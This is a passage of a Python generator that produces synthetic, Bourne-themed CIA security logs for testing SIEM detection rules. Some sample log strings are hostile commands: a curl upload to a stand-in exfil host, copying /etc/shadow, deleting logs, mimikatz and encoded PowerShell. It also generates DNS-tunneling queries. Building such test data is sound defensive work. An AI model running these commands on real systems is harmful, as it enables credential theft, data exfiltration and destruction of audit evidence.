    raw = f"{header} {message}"
    # RFC 6587 octet-counting framing: "<len> <msg>" with NO trailing delimiter.
    # A trailing newline would desync the strict syslog() source's frame parser.
    return f"{len(raw.encode())} {raw}"

# ─── Log generators ────────────────────────────────────────────────────────────

def _panw_event(log_type: str, *, src_ip: str = None, dst_ip: str = None, dst_port: int = None,
                 app: str = None, action: str = None, user: str = None, rule: str = None,
                 sub_type: str = None, threat_name: str = None, threat_category: str = None,
                 url_category: str = None, severity: str = None,
                 config_result: str = None, admin: str = None, cmd: str = None, path: str = None,
                 stage: str = None, status: str = None, region: str = None,
                 bytes_sent: int = None, bytes_received: int = None) -> dict:
    """Build a Palo Alto Networks Firewall (PAN-OS) event. Field names grounded
    in this tenant's own 16 deployed Palo Alto-sourced rules (data/extracted.json):
    metadata.log_name (TRAFFIC/THREAT), activity_name=GLOBALPROTECT, app_name,
    action + unmapped.action, unmapped.sub_type (virus/url/vulnerability),
    unmapped.threat_category/url_category, unmapped.severity, dst_endpoint.ip/port,
    src_endpoint.ip/location.region, unmapped.type=CONFIG/unmapped.result. This
    replaces the earlier Cisco ASA/FTD-shaped events, whose text format didn't
    match any of this tenant's real Cisco FTD rules at all."""
    now = datetime.now(timezone.utc)
    event: dict = {"time_generated": now.strftime("%Y-%m-%dT%H:%M:%SZ")}

    if log_type == "GLOBALPROTECT":
        event["activity_name"] = "GLOBALPROTECT"
        event["unmapped"] = {"stage": stage or "login"}
        event["status"] = status or "success"
        if user: event["user"] = {"name": user}
        if src_ip or region:
            event["src_endpoint"] = {}
            if src_ip: event["src_endpoint"]["ip"] = src_ip
            if region: event["src_endpoint"]["location"] = {"region": region}
        return event

    if log_type == "CONFIG":
        event["unmapped"] = {"type": "CONFIG", "result": config_result or "Succeeded"}
        if admin: event["unmapped"]["admin"] = admin
        if cmd: event["unmapped"]["cmd"] = cmd
        if path: event["unmapped"]["path"] = path
        return event

    # TRAFFIC / THREAT share the connection-log shape.
    event["metadata"] = {"log_name": log_type}
    unmapped: dict = {}
    if app: event["app_name"] = app
    if action:
        event["action"] = action
        unmapped["action"] = action
    if rule: unmapped["rule"] = rule
    if src_ip or region:
        event["src_endpoint"] = {}
        if src_ip: event["src_endpoint"]["ip"] = src_ip
        if region: event["src_endpoint"]["location"] = {"region": region}
    if dst_ip or dst_port:
        event["dst_endpoint"] = {}
        if dst_ip: event["dst_endpoint"]["ip"] = dst_ip
        if dst_port: event["dst_endpoint"]["port"] = dst_port
    if user: event["user"] = {"name": user}

    if log_type == "TRAFFIC":
        if bytes_sent is not None or bytes_received is not None:
            event["traffic"] = {"bytes_out": bytes_sent or 0, "bytes_in": bytes_received or 0}
    elif log_type == "THREAT":
        if sub_type: unmapped["sub_type"] = sub_type
        if threat_category: unmapped["threat_category"] = threat_category
        if url_category: unmapped["url_category"] = url_category
        if severity: unmapped["severity"] = severity
        if threat_name: event["threat"] = {"name": threat_name}

    if unmapped:
        event["unmapped"] = unmapped
    return event

def _panw_line(host: str, event: dict, sev: int = 6) -> str:
    return rfc5424(sev, 23, host, "panw", str(random.randint(1000, 9999)), "PANW",
                   json.dumps(event, separators=(",", ":")))

def gen_panw_traffic() -> str:
    """Ambient PAN-OS Traffic log -- ordinary allowed connections."""
    fw  = random.choice(PANW_FIREWALLS)
    op  = random.choice(OPERATIVES)
    src = random.choice(EXTERNAL_IPS + INTERNAL_IPS)
    dst = random.choice(INTERNAL_IPS)
    port_num, _svc = random.choice(list(SENSITIVE_PORTS.items()))
    event = _panw_event("TRAFFIC", src_ip=src, dst_ip=dst, dst_port=port_num,
                         app=random.choice(PANW_APPS_BENIGN), action="allow",
                         user=op["name"], rule="allow-outbound",
                         bytes_sent=random.randint(256, 500_000),
                         bytes_received=random.randint(512, 2_000_000))
    return _panw_line(fw["host"], event)

def gen_panw_deny() -> str:
    """Ambient PAN-OS Traffic log -- policy denies, not a threat signature hit."""
    fw  = random.choice(PANW_FIREWALLS)
    src = random.choice(EXTERNAL_IPS)
    dst = random.choice(INTERNAL_IPS)
    port_num, _svc = random.choice(list(SENSITIVE_PORTS.items()))
    event = _panw_event("TRAFFIC", src_ip=src, dst_ip=dst, dst_port=port_num,
                         app=random.choice(PANW_APPS_BENIGN), action="deny",
                         rule="deny-inbound")
    return _panw_line(fw["host"], event, sev=4)

def gen_panw_globalprotect() -> str:
    """Ambient PAN-OS GlobalProtect VPN login -- always MFA'd, always succeeds."""
    fw  = random.choice(PANW_FIREWALLS)
    op  = random.choice(OPERATIVES)
    src = random.choice(EXTERNAL_IPS)
    geo = IP_GEO.get(src, {"country": "Unknown"})
    event = _panw_event("GLOBALPROTECT", user=op["alias"], src_ip=src,
                         stage="login", status="success", region=geo["country"])
    return _panw_line(fw["host"], event)

def gen_panw_threat() -> str:
    """Ambient PAN-OS Threat log -- generic malware/vulnerability hits, always
    caught (action=deny/reset/block). Named Bourne-universe signatures only
    appear inside the dedicated scripted scenarios, not here."""
    fw  = random.choice(PANW_FIREWALLS)
    src = random.choice(EXTERNAL_IPS)
    dst = random.choice(INTERNAL_IPS)
    sub_type, category, name, severity = random.choice(PANW_AMBIENT_THREATS)
    event = _panw_event("THREAT", src_ip=src, dst_ip=dst,
                         app=random.choice(PANW_APPS_BENIGN),
                         action=random.choice(["reset", "block", "drop"]),
                         sub_type=sub_type,
                         threat_category=category if sub_type == "virus" else None,
                         url_category=category if sub_type == "url" else None,
                         threat_name=name, severity=severity)
    return _panw_line(fw["host"], event, sev=4)

def _panw_ids_line(host: str, threat_name: str, src_ip: str, dst_ip: str, sev: int = 2) -> str:
    """Scenario-only Threat log hit for a named Bourne-universe signature
    (PAN-OS's real sub_type=vulnerability -- a custom/fictional IPS signature)."""
    event = _panw_event("THREAT", src_ip=src_ip, dst_ip=dst_ip, action="allow",
                         sub_type="vulnerability", threat_name=threat_name, severity="critical")
    return _panw_line(host, event, sev=sev)

def _panw_traffic_line(host: str, src_ip: str, dst_ip: str, dst_port: int, app: str,
                        action: str = "allow", sev: int = 6) -> str:
    event = _panw_event("TRAFFIC", src_ip=src_ip, dst_ip=dst_ip, dst_port=dst_port,
                         app=app, action=action)
    return _panw_line(host, event, sev=sev)

def _panw_vpn_line(host: str, user: str, ip: str, sev: int = 6) -> str:
    geo = IP_GEO.get(ip, {"country": "Unknown"})
    event = _panw_event("GLOBALPROTECT", user=user, src_ip=ip, stage="login",
                         status="success", region=geo["country"])
    return _panw_line(host, event, sev=sev)

def gen_ssh_auth() -> str:
    """Linux sshd auth log (PAM / OpenSSH format)."""
    host = random.choice(INTERNAL_HOSTS)
    op   = random.choice(OPERATIVES)
    src  = random.choice(EXTERNAL_IPS + INTERNAL_IPS)
    pid  = str(random.randint(10000, 65535))
    success = random.random() > 0.25
    if success:
        msg = (
            f"Accepted publickey for {op['name']} from {src} port {random.randint(49152,65535)} "
            f"ssh2: RSA SHA256:{_fake_sha256()}"
        )
        sev = 6
    else:
        msg = (
            f"Failed password for invalid user {op['alias']} from {src} "
            f"port {random.randint(49152,65535)} ssh2"
        )
        sev = 4
    return rfc5424(sev, 4, host, "sshd", pid, "SSHD", msg)

def gen_sudo_event() -> str:
    """Linux sudo usage log."""
    host = random.choice(INTERNAL_HOSTS)
    op   = random.choice(OPERATIVES)
    cmds = [
        "/usr/bin/tail -f /var/log/blackbriar/ops.log",
        "/bin/rm -rf /var/log/treadstone/",
        "/usr/sbin/tcpdump -i eth0 -w /tmp/cap.pcap",
        "/usr/bin/gpg --decrypt /opt/outcome/targets.enc",
        "/usr/bin/openssl s_client -connect langley.cia.gov:443",
        "/sbin/reboot",
        "/usr/bin/curl -s http://exfil.example.com/upload",
        "/bin/cp /etc/shadow /tmp/.hidden_s",
        # Cover-up / Vosen burning the program (Ultimatum)
        "/opt/blackbriar/bin/burn_program.sh --op TREADSTONE --reason COMPROMISED",
        "/usr/bin/shred -u /intel/archive/neski-files-2003.tar.gz",
        "/opt/blackbriar/bin/authorize_kill.py --target jason.bourne --asset ASSET-PAZ",
        # Hirsch's behavioral modification logs (NYC lab)
        "/opt/treadstone/bin/behavior_mod.py --subject david.webb --session induction",
        # Bourne pulling his own file
        "/usr/bin/grep -r 'John Michael Kane' /intel/db/passports/",
        # Outcome chem program (Legacy)
        "/opt/outcome/bin/viral_off.sh --subject 5 --chem green",
        # Dewey / Iron Hand purge (2016)
        "/opt/ironhand/bin/scrub_dewey_comms.sh --before 2016-07-01",
        # Reykjavik breach response
        "/usr/bin/last -ai | grep 84.17.52.190",
    ]
    cmd  = random.choice(cmds)
    tty  = f"pts/{random.randint(0,5)}"
    pid  = str(random.randint(10000, 65535))
    msg  = (
        f"{op['name']} : TTY={tty} ; PWD=/root ; USER=root ; COMMAND={cmd}"
    )
    return rfc5424(5, 10, host, "sudo", pid, "SUDO", msg)

def gen_pam_session() -> str:
    """Linux PAM session open/close."""
    host   = random.choice(INTERNAL_HOSTS)
    op     = random.choice(OPERATIVES)
    action = random.choice(["opened", "closed"])
    pid    = str(random.randint(10000, 65535))
    svc    = random.choice(["sshd", "login", "su", "sudo"])
    msg    = f"pam_unix({svc}:session): session {action} for user {op['name']} by (uid=0)"
    return rfc5424(6, 10, host, "PAM", pid, "PAM", msg)

def gen_apache_access() -> str:
    """Apache Combined Log Format wrapped in syslog."""
    host      = random.choice(INTERNAL_HOSTS)
    src       = random.choice(EXTERNAL_IPS + INTERNAL_IPS)
    op        = random.choice(OPERATIVES)
    path      = random.choice(HTTP_PATHS)
    ua        = random.choice(USER_AGENTS)
    method    = random.choice(["GET", "POST", "PUT", "DELETE", "OPTIONS"])
    statuses  = [200]*6 + [201, 204, 301, 302, 400, 401, 403, 404, 500, 503]
    status    = random.choice(statuses)
    size      = random.randint(200, 150_000)
    pid       = str(random.randint(1000, 9999))
    # Apache combined log format
    ts_apache = datetime.now(timezone.utc).strftime("%d/%b/%Y:%H:%M:%S +0000")
    clf = (
        f'{src} - {op["name"]} [{ts_apache}] '
        f'"{method} {path} HTTP/1.1" {status} {size} '
        f'"-" "{ua}"'
    )
    return rfc5424(6, 16, host, "apache2", pid, "HTTP", clf)

def gen_cron_job() -> str:
    """cron execution — scheduled Treadstone tasks."""
    host = random.choice(INTERNAL_HOSTS)
    pid  = str(random.randint(10000, 65535))
    jobs = [
        "root CMD (/opt/treadstone/bin/purge_deniable_assets.sh)",
        "root CMD (/opt/blackbriar/bin/sweep_sigint.py --quiet)",
        "root CMD (/usr/local/bin/exfil_sync.sh --dest ops-dmz-gw01)",
        "root CMD (/opt/outcome/bin/subject_monitor.py --id 8812)",
        "root CMD (/bin/bash /opt/larx/rotate_creds.sh)",
        "root CMD (/opt/blackbriar/bin/generate_cover_identities.py --count 5)",
        "root CMD (/opt/outcome/bin/chem_dose_scheduler.py --program LARX)",
        "root CMD (/opt/ironhand/bin/social_scrape.py --src deepdream)",
        "root CMD (/opt/treadstone/bin/asset_checkin.sh --all-stations)",
        "root CMD (/opt/blackbriar/bin/satphone_intercept.py --grid berlin)",
        "root CMD (/usr/local/bin/wipe_surveillance_cache.sh --older-than 30d)",
        "root CMD (/opt/ironhand/bin/track_subject.py --name jason.bourne)",
    ]
    msg = random.choice(jobs)
    return rfc5424(6, 9, host, "cron", pid, "CRON", msg)

def gen_kernel_audit() -> str:
    """Linux auditd / kernel netfilter drop."""
    host = random.choice(INTERNAL_HOSTS)
    src  = random.choice(EXTERNAL_IPS)
    dst  = random.choice(INTERNAL_IPS)
    port_num = random.choice(list(SENSITIVE_PORTS.keys()))
    mac  = ":".join([f"{random.randint(0,255):02x}" for _ in range(6)])
    msg  = (
        f"kernel: [UFW BLOCK] IN=eth0 OUT= MAC={mac} "
        f"SRC={src} DST={dst} LEN={random.randint(40,1500)} TOS=0x00 "
        f"PREC=0x00 TTL={random.randint(40,128)} ID={random.randint(1000,60000)} "
        f"DF PROTO=TCP SPT={random.randint(49152,65535)} DPT={port_num} "
        f"WINDOW={random.randint(1024,65535)} RES=0x00 SYN URGP=0"
    )
    return rfc5424(4, 0, host, "kernel", "-", "AUDIT", msg)

# Duo result → (reasons) weighted toward realistic distributions
_DUO_OUTCOMES = (
    [("success", "user_approved",        "duo_push")] * 10 +
    [("success", "valid_passcode",       "passcode")] * 4 +
    [("success", "phone_call_approved",  "phone_call")] * 1 +
    [("success", "anonymous_ip",         "duo_push")] * 1 +
    [("success", "endpoint_is_not_trusted", "duo_push")] * 1 +
    [("denied",  "user_mistake",         "duo_push")] * 2 +
    [("denied",  "no_response",          "duo_push")] * 2 +
    [("denied",  "locked_out",           "duo_push")] * 1 +
    [("denied",  "invalid_passcode",     "passcode")] * 1 +
    [("denied",  "deny_unenrolled_user", "duo_push")] * 1 +
    [("denied",  "anomalous_push",       "duo_push")] * 1 +
    [("fraud",   "user_marked_fraud",    "duo_push")] * 2
)

def gen_duo_auth() -> str:
    """Cisco Duo authentication log. Field names grounded in this tenant's
    real deployed Duo rules (status/status_detail/unmapped.event_type/
    unmapped.factor -- NOT the raw Admin API v2 top-level event_type/factor/
    reason/result shape used before, which none of those real rules matched).
    """
    proxy   = random.choice(DUO_PROXIES)
    op      = random.choice(OPERATIVES)
    app     = random.choice(DUO_APPLICATIONS)
    src     = random.choice(EXTERNAL_IPS)
    geo     = IP_GEO.get(src, {"city": "Unknown", "state": "Unknown", "country": "Unknown"})
    result, reason, factor = random.choice(_DUO_OUTCOMES)

    now     = datetime.now(timezone.utc)
    txid    = "-".join(
        "".join(random.choices("0123456789abcdef", k=n)) for n in (8, 4, 4, 4, 12)
    )

    event = {
        "access_device": {
            "ip": src,
            "location": {
                "city":    geo["city"],
                "state":   geo["state"],
                "country": geo["country"],
            },
            "browser":         random.choice(["Chrome", "Firefox", "Edge", "Safari"]),
            "browser_version": f"{random.randint(110,124)}.0",
            "os":              random.choice(["Windows", "Mac OS X", "Linux", "iOS", "Android"]),
            "os_version":      f"{random.randint(10,15)}.{random.randint(0,6)}",
        },
        "application": {
            "name": app,
            "key":  "DI" + "".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=18)),
        },
        "auth_device": {
            "ip":       src,
            "location": {
                "city":    geo["city"],
                "state":   geo["state"],
                "country": geo["country"],
            },
            "name": f"+1 555-{random.randint(100,999)}-{random.randint(1000,9999)}",
        },
        "status":        result,
        "status_detail": reason,
        "unmapped": {"event_type": "authentication", "factor": factor},
        # Duo's native epoch field is `timestamp`, but that collides with the
        # HEC envelope's reserved `timestamp` when DataPipeline root-merges the
        # parsed JSON (string-vs-int type conflict). Renamed to dodge the clash.
        "auth_timestamp": int(now.timestamp()),
        "isotimestamp": now.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "+00:00",
        "txid":         txid,
        "user": {
            "name":   op["alias"],
            "key":    "DU" + "".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=18)),
            "groups": [op["clearance"]],
        },
        # Canonical corporate identity (matches Email recipient + Windows
        # TargetUserName) so cross-source identity correlations join. The cover
        # identity (alias) stays in user.name above for flavor.
        "email": f"{op['name']}@cia.gov",
    }

    # Duo severity: fraud → alert(1), denied → warning(4), success → info(6)
    sev = {"fraud": 1, "denied": 4, "success": 6}[result]
    return rfc5424(sev, 13, proxy, "duo", "-", "DUO", json.dumps(event, separators=(",", ":")))

def gen_duo_admin() -> str:
    """Cisco Duo Administrator log event -- ordinary admin-console housekeeping
    (password resets, policy/group edits, hardware tokens). This is a distinct
    real Duo log type (unmapped.eventtype=administrator) that was missing
    entirely before; ambient actions here are routine, not suspicious."""
    proxy = random.choice(DUO_PROXIES)
    admin = random.choice(DUO_ADMINS)
    action, description, sev = random.choice(DUO_ADMIN_ACTIONS)
    now = datetime.now(timezone.utc)
    event = {
        "unmapped": {"eventtype": "administrator", "action": action, "description": description},
        "user": {"name": admin},
        "isotimestamp": now.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "+00:00",
        "email": f"{admin}@cia.gov",
    }
    return rfc5424(sev, 13, proxy, "duo", "-", "DUO", json.dumps(event, separators=(",", ":")))

def gen_web_proxy() -> str:
    """Ambient Zscaler Internet Access traffic (JSON). Suspicious
    destinations are properly blocked/IPS-reset almost every time -- an
    "Allowed" hit against a known-bad domain only shows up in dedicated
    exfil/C2 scenarios, not here."""
    proxy  = random.choice(WEB_PROXIES)
    client = random.choice(INTERNAL_IPS)
    op     = random.choice(OPERATIVES)

    suspicious = random.random() < 0.15
    url, _peer_ip, _ctype = random.choice(EGRESS_SUSPICIOUS if suspicious else EGRESS_BENIGN)
    hostname = url.split("://")[-1].split("/")[0]
    method = ("CONNECT" if url.startswith("https://") and random.random() < 0.7
              else random.choice(["GET", "GET", "GET", "POST"]))

    if suspicious:
        action = random.choice(["Blocked", "IPS Reset", "Drop"])  # caught almost every time
        event: dict = {
            "app_name": "Suspicious Web Activity",
            "action": action,
            "user": {"name": op["name"]},
            "client_ip": client,
            "http_request": {"method": method, "url": {"hostname": hostname, "categories": ["Suspicious Destinations"]}},
            "risk_details": "malicious",
            "bytes": random.randint(200, 800),
            "time": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
            "malware": {"name": random.choice(["cobaltstrike", "unknown.rat", "generic.trojan"])},
            "unmapped": {"event": {"threatcat": random.choice(["botnets", "c2", "malware"])}},
        }
        sev = 4
    else:
        bytes_ = (random.randint(256, 6_000_000) if method in ("POST", "CONNECT")
                  else random.randint(256, 200_000))
        event = {
            "app_name": "Web Browsing",
            "action": "Allowed",
            "user": {"name": op["name"]},
            "client_ip": client,
            "http_request": {"method": method, "url": {"hostname": hostname, "categories": ["General Browsing"]}},
            "risk_details": "benign",
            "bytes": bytes_,
            "time": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
        }
        sev = 6
    return rfc5424(sev, 16, proxy, "zscaler", str(random.randint(1000, 9999)), "PROXY",
                   json.dumps(event, separators=(",", ":")))

def _b32(n: int) -> str:
    return "".join(random.choices("abcdefghijklmnopqrstuvwxyz234567", k=n))

def gen_dns_query() -> str:
    """ISC BIND query log (querylog format)."""
    host     = random.choice(["langley-dc01.cia.gov", "ops-dmz-gw01.cia.gov", "noc-ids01.cia.gov"])
    client   = random.choice(INTERNAL_IPS)
    resolver = random.choice(DNS_RESOLVERS)
    r = random.random()
    if r < 0.15:
        # DNS tunneling — long base32 labels under an exfil domain
        domain = f"{_b32(20)}.{_b32(12)}.exfil.example.net"
        qtype  = random.choice(["TXT", "NULL"])
        sev    = 4
    elif r < 0.45:
        domain, qtype = random.choice(DNS_SUSPICIOUS)
        sev = 4
    else:
        domain, qtype = random.choice(DNS_BENIGN)
        sev = 6
    cid = hex(random.randint(0x100000, 0xFFFFFF))
    msg = (f"client @{cid} {client}#{random.randint(1024,65535)} ({domain}): "
           f"query: {domain} IN {qtype} +E(0) ({resolver})")
    return rfc5424(sev, 3, host, "named", str(random.randint(100,9999)), "DNS", msg)

def _mimecast_event(*, recipient: str, sender_name: str, sender: str, subject: str,
                     direction: str = "inbound", actor_invoked_by: str = "Entry Scan",
                     event_type: str | None = None, malicious: bool = False,
                     category: str | None = None, blocked: bool = False,
                     file_type: str | None = None, file_name: str | None = None,
                     url: str | None = None, rejected: bool = False) -> dict:
    """Build a Mimecast-shaped email-security event. Field names grounded in
    this tenant's own deployed Mimecast-sourced rules (see the comment above
    MIMECAST_MALICIOUS_CATEGORIES). `blocked` always sets a concrete
    unmapped.action value (hold/block/bounce vs none) rather than omitting
    the field, so detections can cleanly test for "malicious and NOT blocked"."""
    now = datetime.now(timezone.utc)
    event: dict = {
        "direction": direction,
        "actor": {"invoked_by": actor_invoked_by},
        "status_detail": "malicious" if malicious else "clean",
        "email": {"from": sender, "fromName": sender_name, "to": recipient, "subject": subject},
        "receivedTime": now.strftime("%Y-%m-%dT%H:%M:%SZ"),
        "unmapped": {"route": direction, "action": [], "actions": [], "adminOverride": []},
    }
    actions = list(MIMECAST_BLOCK_ACTIONS) if blocked else ["none"]
    event["unmapped"]["action"] = actions
    event["unmapped"]["actions"] = actions
    event["unmapped"]["adminOverride"] = actions
    if event_type:
        # Flat dotted key, NOT a nested {"event": {...}} object -- "event" is
        # DataPipeline's own envelope-reserved key (the original HEC body
        # field, pre-rename to "message"), so a nested top-level "event"
        # object gets silently dropped on the way through. A literal
        # "event.type" string key sidesteps that collision entirely while
        # still landing as the real rule-matching attribute name.
        event["event.type"] = event_type
        if event_type == "TTP Impersonation Protection":
            event["unmapped"]["taggedMalicious"] = malicious
    if category:
        event["unmapped"]["category"] = category
    if file_type or file_name:
        event["file"] = {}
        if file_type: event["file"]["type"] = file_type
        if file_name:
            event["file"]["name"] = file_name
            event["unmapped"]["AttNames"] = [file_name]
        event["unmapped"]["actionTriggered"] = actions
    if url:
        event["url"] = {"address": url}
    if rejected:
        event["unmapped"]["Act"] = "Rej"
        event["api"] = {"response": {"message": "Invalid Recipient Address"}}
    return event

def _email_line(event: dict) -> str:
    sev = 4 if event.get("status_detail") == "malicious" else 6
    return rfc5424(sev, 13, "mimecast-relay01.cia.gov", "mimecast", "-", "EMAIL",
                   json.dumps(event, separators=(",", ":")))

def gen_email_threat() -> str:
    """Mimecast email-security gateway log (JSON). Mostly clean inbound
    business mail; phishing/malware that DOES appear is properly held or
    blocked -- genuinely undetected malicious mail only shows up in the
    dedicated scenarios (sc_phish_landy, sc_langley_insider_leak)."""
    op = random.choice(OPERATIVES)
    recipient = f"{op['name']}@cia.gov"
    roll = random.random()

    if roll < 0.75:
        name, sender = random.choice(MIMECAST_BENIGN_SENDERS)
        event = _mimecast_event(recipient=recipient, sender_name=name, sender=sender,
                                 subject=random.choice(MIMECAST_BENIGN_SUBJECTS))
    elif roll < 0.90:
        name, sender = random.choice(PHISH_SENDERS)
        subject = random.choice(["ACTION REQUIRED: verify your account", "Invoice overdue", "Password expires today"])
        event = _mimecast_event(recipient=recipient, sender_name=name, sender=sender, subject=subject,
                                 malicious=True, category=random.choice(MIMECAST_MALICIOUS_CATEGORIES), blocked=True)
    elif roll < 0.97:
        name, sender = random.choice(PHISH_SENDERS)
        attachment = random.choice(PHISH_ATTACHMENTS)
        event = _mimecast_event(recipient=recipient, sender_name=name, sender=sender,
                                 subject="Please review the attached document",
                                 event_type="TTP Attachment Protection", malicious=True, blocked=True,
                                 file_type=attachment.rsplit(".", 1)[-1], file_name=attachment)
    else:
        event = _mimecast_event(recipient=recipient, sender_name="External", sender="unknown@example.net",
                                 subject="(clicked link)", actor_invoked_by="User Click", malicious=True,
                                 category=random.choice(["Anonymizers", "Compromised", "Peer-to-Peer"]),
                                 blocked=True, url="http://" + random.choice(DNS_SUSPICIOUS)[0])
    return _email_line(event)

def gen_db_audit() -> str:
    """PostgreSQL pgAudit record from the classified intel DB."""
    op   = random.choice(OPERATIVES)
    obj  = random.choice(DB_OBJECTS)
    cmd, cls = random.choice([("SELECT", "READ"), ("SELECT", "READ"), ("SELECT", "READ"),
                              ("UPDATE", "WRITE"), ("DELETE", "WRITE"), ("INSERT", "WRITE")])
    rows = random.choice([1, 1, 3, 12, 47, 1847])  # 1847 = whole roster
    stmt = {
        "SELECT": f"SELECT * FROM {obj.split('.')[1]} WHERE clearance='TREADSTONE'",
        "UPDATE": f"UPDATE {obj.split('.')[1]} SET status='BURNED' WHERE id={random.randint(1,9999)}",
        "DELETE": f"DELETE FROM {obj.split('.')[1]} WHERE id={random.randint(1,9999)}",
        "INSERT": f"INSERT INTO {obj.split('.')[1]} (alias) VALUES ('{op['alias']}')",
    }[cmd]
    sid = random.randint(1, 99999)
    msg = (f"{op['name']}@{DB_NAME} LOG:  AUDIT: SESSION,{sid},1,{cls},{cmd},TABLE,{obj},"
           f'"{stmt}",<not logged> rows={rows}')
    sev = 4 if rows >= 1000 or cls == "WRITE" else 6
    return rfc5424(sev, 16, "blackbriar-db01.cia.gov", "postgres", str(random.randint(1000,9999)),
                   "DBAUDIT", msg)

# Maps the old flat PascalCase field names (still used as scenario call-site
# kwargs, for readability) to this tenant's real deployed Windows Event Logs
# rules' lowerCamelCase winEventLog.data.event.eventData.* field names.
_WIN_FIELD_MAP = {
    "LogonType": "logonType", "TargetUserName": "targetUserName",
    "TargetDomainName": "targetDomainName", "IpAddress": "ipAddress",
    "Status": "status", "SubStatus": "subStatus", "FailureReason": "failureReason",
    "NewProcessName": "newProcessName", "CommandLine": "commandLine",
    "ParentProcessName": "parentProcessName", "SubjectUserName": "subjectUserName",
    "CallerComputerName": "callerComputerName", "PrivilegeList": "privilegeList",
    "ServiceName": "serviceName", "TicketEncryptionType": "ticketEncryptionType",
}

def _win_event_json(comp: str, eid: int, description: str, event_data: dict) -> dict:
    """Nest a Windows Security Event to match this tenant's own 59 deployed
    Windows Event Logs rules: winEventLog.id/channel/description +
    winEventLog.data.event.{system.eventID, eventData.<lowerCamelCase>} --
    NOT the flat top-level EventID/TargetUserName shape used before, which
    none of those real rules could ever match against."""
    now = datetime.now(timezone.utc)
    return {
        "winEventLog": {
            "channel": "Security",
            "id": eid,
            "providerName": "Microsoft-Windows-Security-Auditing",
            "description": description,
            "data": {"event": {
                "system": {"eventID": eid,
                           "provider": {"name": "Microsoft-Windows-Security-Auditing"}},
                "eventData": event_data,
            }},
        },
        "Computer": f"{comp}.CIA.LOCAL",
        "TimeCreated": now.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z",
    }

def gen_win_event() -> str:
    """Windows Security Event log, nested to match this tenant's real deployed
    Windows Event Logs rules (see _win_event_json)."""
    comp = random.choice(WIN_HOSTS)
    op   = random.choice(OPERATIVES)
    eid  = random.choices([4624, 4625, 4768, 4769, 4688, 4740, 4672],
                          weights=[6, 4, 3, 3, 4, 1, 2])[0]
    sev = 6
    if eid == 4624:
        lt = random.choice(list(WIN_LOGON_TYPES))
        description = "An account was successfully logged on."
        data = {"logonType": lt, "targetUserName": op["name"], "targetDomainName": "CIA",
                "ipAddress": random.choice(EXTERNAL_IPS + INTERNAL_IPS)}
    elif eid == 4625:
        st, sub, reason = random.choice(WIN_FAIL_STATUS)
        description = "An account failed to log on."
        data = {"logonType": 3, "targetUserName": op["alias"], "targetDomainName": "CIA",
                "status": st, "subStatus": sub, "failureReason": reason,
                "ipAddress": random.choice(EXTERNAL_IPS)}
        sev = 4
    elif eid == 4768:
        description = "A Kerberos authentication ticket (TGT) was requested."
        data = {"targetUserName": op["name"], "targetDomainName": "CIA.LOCAL",
                "serviceName": "krbtgt", "ticketEncryptionType": "0x12",
                "ipAddress": random.choice(INTERNAL_IPS)}
    elif eid == 4769:
        enc = random.choice(["0x12", "0x12", "0x17"])  # 0x17 = RC4 → kerberoastable
        description = "A Kerberos service ticket was requested."
        data = {"targetUserName": f"{op['name']}@CIA.LOCAL",
                "serviceName": random.choice(["MSSQLSvc/blackbriar-db01", "HTTP/ironhand-ctrl01",
                                              "CIFS/langley-dc01"]),
                "ticketEncryptionType": enc, "ipAddress": random.choice(INTERNAL_IPS)}
        if enc == "0x17":
            sev = 4
    elif eid == 4688:
        proc = random.choice(["powershell.exe -enc SQBFAFgA", "cmd.exe /c whoami /all",
                              "rundll32.exe", "mimikatz.exe", "net.exe group \"Domain Admins\""])
        description = "A new process has been created."
        data = {"newProcessName": f"C:\\Windows\\System32\\{proc.split()[0]}",
                "commandLine": proc, "parentProcessName": "C:\\Windows\\explorer.exe",
                "subjectUserName": op["name"]}
    elif eid == 4740:
        description = "A user account was locked out."
        data = {"targetUserName": op["alias"], "callerComputerName": random.choice(WIN_HOSTS)}
        sev = 4
    else:  # 4672
        description = "Special privileges assigned to new logon."
        data = {"subjectUserName": op["name"], "privilegeList": "SeDebugPrivilege, SeTcbPrivilege"}
    event = _win_event_json(comp, eid, description, data)
    return rfc5424(sev, 13, f"{comp.lower()}.cia.gov", "Security", "-", "WINEVENT",
                   json.dumps(event, separators=(",", ":")))

def _cloudtrail_event(op: dict, program: str, event_name: str, event_source: str,
                       request_params: dict | None = None, response_elements: dict | None = None,
                       read_only: bool = True, mfa: bool = True, source_ip: str | None = None,
                       error_code: str | None = None, error_message: str | None = None,
                       root: bool = False) -> dict:
    """Build a realistic CloudTrail record for a benign, MFA-enforced AssumeRole session."""
    account = AWS_ACCOUNTS[program]
    role = AWS_ROLES[program]
    region = random.choice(AWS_REGIONS)
    now = datetime.now(timezone.utc)
    principal_id = "AROA" + "".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=16))
    event = {
        "eventVersion": "1.08",
        "userIdentity": {"type": "Root", "principalId": account, "accountId": account,
                          "arn": f"arn:aws:iam::{account}:root"} if root else {
            "type": "AssumedRole",
            "principalId": f"{principal_id}:{op['name']}",
            "arn": f"arn:aws:sts::{account}:assumed-role/{role}/{op['name']}",
            "accountId": account,
            "sessionContext": {
                "sessionIssuer": {"type": "Role", "principalId": principal_id,
                                  "arn": f"arn:aws:iam::{account}:role/{role}", "accountId": account},
                "attributes": {"mfaAuthenticated": "true" if mfa else "false",
                               "creationDate": now.strftime("%Y-%m-%dT%H:%M:%SZ")},
            },
        },
        "eventTime": now.strftime("%Y-%m-%dT%H:%M:%SZ"),
        "eventSource": event_source,
        "eventName": event_name,
        "awsRegion": region,
        "sourceIPAddress": source_ip or random.choice(AWS_TRUSTED_SOURCE_IPS),
        "userAgent": random.choice(["aws-cli/2.15.0", "console.amazonaws.com",
                                     "Boto3/1.34.0 Python/3.12"]),
        "requestParameters": request_params or {},
        "responseElements": response_elements,
        "requestID": "-".join("".join(random.choices("0123456789abcdef", k=n)) for n in (8, 4, 4, 4, 12)),
        "eventID": "-".join("".join(random.choices("0123456789abcdef", k=n)) for n in (8, 4, 4, 4, 12)),
        "readOnly": read_only,
        "eventType": "AwsApiCall",
        "managementEvent": True,
        "recipientAccountId": account,
    }
